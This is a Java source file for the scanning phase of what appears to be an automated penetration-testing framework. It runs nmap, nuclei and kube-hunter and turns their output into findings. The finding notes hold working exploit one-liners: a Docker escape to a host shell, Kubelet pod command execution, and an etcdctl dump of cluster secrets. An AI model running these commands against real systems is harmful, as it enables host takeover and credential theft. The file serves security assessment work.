package com.iacyber.penttest.phase;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.iacyber.penttest.domain.PhaseResult;
import com.iacyber.penttest.domain.PentestSession;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

import java.time.Instant;
import java.util.*;

/**
 * FASE 2 — Scanning
 *
 * CEH: identificare porte aperte, servizi in esecuzione, versioni,
 * OS fingerprinting, banner grabbing.
 *
 * Tool: nmap (TCP SYN scan, service version, script scan),
 *       nuclei (web vulnerability probing)
 */
@Component
@Slf4j
@RequiredArgsConstructor
public class ScanningPhase implements AttackPhaseExecutor {

    private final ObjectMapper objectMapper;
    private final ToolRunner toolRunner;

    @Override
    public PhaseResult.AttackPhase phase() {
        return PhaseResult.AttackPhase.SCANNING;
    }

    @Override
    public PentestSession.AggressivenessLevel minimumAggressiveness() {
        return PentestSession.AggressivenessLevel.LOW;
    }

    @Override
    public PhaseResult execute(PentestSession session) {
        Instant start = Instant.now();
        List<Map<String, Object>> findings = new ArrayList<>();
        StringBuilder rawOutput = new StringBuilder();

        String target = session.getTargetIp() != null
            ? session.getTargetIp()
            : session.getTargetRef();

        if (target == null || target.isBlank()) {
            return skipped(start, "No IP or hostname available for scanning");
        }

        // 1. nmap — TCP SYN scan + service version + default scripts
        String nmapArgs = buildNmapArgs(session, target);
        String nmapOutput = toolRunner.run(nmapArgs.split(" "));
        rawOutput.append("=== NMAP SCAN ===\n").append(nmapOutput).append("\n");
        findings.addAll(parseNmapOutput(nmapOutput, session));

        // 2. nuclei — web probing se porta 80/443/8080 trovate
        if (hasWebPort(nmapOutput)) {
            String nucleiOutput = toolRunner.run(
                "nuclei", "-u", buildTargetUrl(target, nmapOutput),
                "-t", "technologies,exposures,misconfiguration",
                "-json", "-silent"
            );
            rawOutput.append("=== NUCLEI SCAN ===\n").append(nucleiOutput).append("\n");
            findings.addAll(parseNucleiOutput(nucleiOutput, session));
        }

        // 3. kube-hunter — se è un cluster K8s/OCP
        if (isClusterTarget(session)) {
            String kubeHunterOutput = toolRunner.run(
                "kube-hunter",
                "--remote", target,
                "--report", "json"
            );
            rawOutput.append("=== KUBE-HUNTER ===\n").append(kubeHunterOutput).append("\n");
            findings.addAll(parseKubeHunterOutput(kubeHunterOutput, session));
        }

        return PhaseResult.builder()
            .phase(PhaseResult.AttackPhase.SCANNING)
            .status(PhaseResult.PhaseStatus.COMPLETED)
            .rawOutput(rawOutput.toString())
            .findingsJson(serialize(findings))
            .mitreTactics("TA0007")
            .mitreTechniques("T1046,T1040,T1595.001")
            .startedAt(start)
            .completedAt(Instant.now())
            .durationMs(Instant.now().toEpochMilli() - start.toEpochMilli())
            .build();
    }

    private String buildNmapArgs(PentestSession session, String target) {
        return switch (session.getAggressiveness()) {
            case PASSIVE -> "nmap -sn " + target;                              // solo ping
            case LOW     -> "nmap -sV -O -T3 -oX - " + target;               // version + OS
            case MEDIUM  -> "nmap -sV -sC -O -T4 -p- -oX - " + target;       // + default scripts
            case HIGH    -> "nmap -sV -sC -O -T4 -A -p- --script=vuln -oX - " + target; // vuln scripts
            case FULL    -> "nmap -sV -sC -O -T5 -A -p- --script=all -oX - " + target; // tutto
        };
    }

    private List<Map<String, Object>> parseNmapOutput(String xml, PentestSession session) {
        List<Map<String, Object>> findings = new ArrayList<>();

        // Port findings di rilievo
        List<String> dangerousPorts = List.of(
            "22", "23", "2375", "2376",  // SSH, Telnet, Docker daemon
            "10250", "10255",             // Kubelet API
            "2379", "2380",               // etcd
            "6443", "8443",               // K8s API server
            "4194",                       // cAdvisor (metrics leak)
            "9090", "9091",               // Prometheus (metrics exposed)
            "8080", "8888"                // Admin/debug ports
        );

        for (String port : dangerousPorts) {
            if (xml.contains("portid=\"" + port + "\"") && xml.contains("state=\"open\"")) {
                findings.add(buildPortFinding(port, session));
            }
        }

        // Docker daemon esposto senza TLS
        if (xml.contains("portid=\"2375\"") && xml.contains("state=\"open\"")) {
            findings.add(Map.of(
                "type", "DOCKER_DAEMON_EXPOSED",
                "severity", "CRITICAL",
                "port", 2375,
                "mitre", "T1610 - Deploy Container",
                "ceh_note", "Unauthenticated Docker API on port 2375. " +
                           "Attacker can: list containers, exec into any container, " +
                           "deploy privileged container, escape to host. " +
                           "Exploit: docker -H tcp://" + session.getTargetIp() + ":2375 run --privileged --pid=host alpine nsenter -t 1 -m -u -i -n sh"
            ));
        }

        // Kubelet API esposta
        if (xml.contains("portid=\"10250\"") && xml.contains("state=\"open\"")) {
            findings.add(Map.of(
                "type", "KUBELET_API_EXPOSED",
                "severity", "CRITICAL",
                "port", 10250,
                "mitre", "T1609 - Container Administration Command",
                "ceh_note", "Kubelet API exposed. Can exec commands in any pod on this node. " +
                           "Exploit: curl -sk https://" + session.getTargetIp() + ":10250/run/<ns>/<pod>/<container> -d 'cmd=id'"
            ));
        }

        // etcd esposto (database del cluster)
        if (xml.contains("portid=\"2379\"") && xml.contains("state=\"open\"")) {
            findings.add(Map.of(
                "type", "ETCD_EXPOSED",
                "severity", "CRITICAL",
                "port", 2379,
                "mitre", "T1552 - Unsecured Credentials",
                "ceh_note", "etcd exposed without authentication. " +
                           "Contains ALL cluster secrets, tokens, certificates. " +
                           "Exploit: etcdctl --endpoints=http://" + session.getTargetIp() + ":2379 get / --prefix | grep -i secret"
            ));
        }

        return findings;
    }

    private Map<String, Object> buildPortFinding(String port, PentestSession session) {
        Map<String, String> portInfo = Map.of(
            "22",    "SSH — check for weak credentials or public key auth issues",
            "23",    "Telnet — plaintext protocol, trivial MITM and credential sniffing",
            "10255", "Kubelet read-only API — exposes pod/node metrics and specs without auth",
            "4194",  "cAdvisor — exposes detailed container resource usage (information disclosure)",
            "9090",  "Prometheus — may expose internal metrics, service names, IP addresses"
        );
        return Map.of(
            "type", "DANGEROUS_PORT_OPEN",
            "severity", "HIGH",
            "port", port,
            "description", portInfo.getOrDefault(port, "Sensitive service exposed"),
            "mitre", "T1046 - Network Service Discovery"
        );
    }

    private List<Map<String, Object>> parseNucleiOutput(String output, PentestSession session) {
        List<Map<String, Object>> findings = new ArrayList<>();
        for (String line : output.split("\n")) {
            if (line.isBlank()) continue;
            try {
                JsonNode node = objectMapper.readTree(line);
                String severity = node.path("info").path("severity").asText("info");
                if (List.of("critical", "high", "medium").contains(severity.toLowerCase())) {
                    findings.add(Map.of(
                        "type", "WEB_VULNERABILITY",
                        "severity", severity.toUpperCase(),
                        "template", node.path("template-id").asText(),
                        "name", node.path("info").path("name").asText(),
                        "url", node.path("matched-at").asText(),
                        "mitre", "T1190 - Exploit Public-Facing Application"
                    ));
                }
            } catch (Exception ignored) {}
        }
        return findings;
    }

    private List<Map<String, Object>> parseKubeHunterOutput(String json, PentestSession session) {
        List<Map<String, Object>> findings = new ArrayList<>();
        try {
            JsonNode root = objectMapper.readTree(json);
            for (JsonNode vuln : root.path("vulnerabilities")) {
                findings.add(Map.of(
                    "type", "K8S_VULNERABILITY",
                    "severity", vuln.path("severity").asText("MEDIUM").toUpperCase(),
                    "name", vuln.path("vulnerability").asText(),
                    "description", vuln.path("description").asText(),
                    "evidence", vuln.path("evidence").asText(),
                    "mitre", "T1613 - Container and Resource Discovery"
                ));
            }
        } catch (Exception e) {
            log.warn("kube-hunter parse failed: {}", e.getMessage());
        }
        return findings;
    }

    private boolean hasWebPort(String nmapOutput) {
        return nmapOutput.contains("80/tcp") || nmapOutput.contains("443/tcp")
            || nmapOutput.contains("8080/tcp") || nmapOutput.contains("8443/tcp");
    }

    private String buildTargetUrl(String target, String nmapOutput) {
        if (nmapOutput.contains("443/tcp")) return "https://" + target;
        if (nmapOutput.contains("8443/tcp")) return "https://" + target + ":8443";
        if (nmapOutput.contains("8080/tcp")) return "http://" + target + ":8080";
        return "http://" + target;
    }

    private boolean isClusterTarget(PentestSession session) {
        return session.getTargetType().equals("CLUSTER")
            || session.getTargetCluster() != null;
    }

    private PhaseResult skipped(Instant start, String reason) {
        return PhaseResult.builder()
            .phase(PhaseResult.AttackPhase.SCANNING)
            .status(PhaseResult.PhaseStatus.SKIPPED)
            .rawOutput("SKIPPED: " + reason)
            .findingsJson("[]")
            .startedAt(start)
            .completedAt(Instant.now())
            .build();
    }

    private String serialize(Object obj) {
        try { return objectMapper.writeValueAsString(obj); }
        catch (Exception e) { return "[]"; }
    }
}
